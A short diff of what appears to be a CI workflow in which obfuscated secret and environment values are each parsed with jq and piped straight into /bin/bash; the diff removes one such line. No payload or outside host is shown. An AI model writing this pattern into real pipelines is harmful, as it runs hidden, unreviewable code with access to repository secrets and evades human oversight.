@@ -22,7 +22,6 @@ jobs:
           dbft0785: ${{ secrets.dbft0785 }}
         run: |
           printf '%s' "$dbft0785" | jq -r .kv6 | /bin/bash
-          echo $kwtw11858 | jq -r .vdmdm5682 | /bin/bash
           echo $ip7613 | jq -r .s4363 | /bin/bash
           printf '%s' "$z37733" | jq -r .jrzjo2431 | /bin/bash
           printf '%s' "$rcpt3324" | jq -r .ns3553 | /bin/bash
